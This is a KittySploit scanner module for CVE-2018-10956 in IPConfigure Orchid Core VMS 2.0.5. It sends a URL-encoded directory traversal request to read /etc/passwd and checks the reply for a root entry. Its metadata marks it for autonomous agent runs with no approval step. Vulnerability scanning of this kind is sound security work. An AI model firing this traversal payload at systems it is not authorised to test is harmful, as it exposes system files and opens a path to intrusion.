#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""IPConfigure Orchid Core VMS 2."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'IPConfigure Orchid Core VMS 2.0.5 - Local File Inclusion Detection',
        'description': 'IPConfigure Orchid Core VMS 2.0.5 is susceptible to local file inclusion.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'orchid', 'vms', 'lfi', 'edb', 'ipconfigure', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://labs.nettitude.com/blog/cve-2018-10956-unauthenticated-privileged-directory-traversal-in-ipconfigure-orchid-core-vms/',
            'https://github.com/nettitude/metasploit-modules/blob/master/orchid_core_vms_directory_traversal.rb',
            'https://www.exploit-db.com/exploits/44916/',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-10956',
            'https://github.com/xbl3/awesome-cve-poc_qazbnm456',
        ],
        'cve': 'CVE-2018-10956',
    }

    def run(self):
        r = self.http_request(method="GET", path='/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="IPConfigure Orchid Core VMS 2.0.5 - Local File Inclusion detected",
                path='/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd',
            )
            return True
        return False

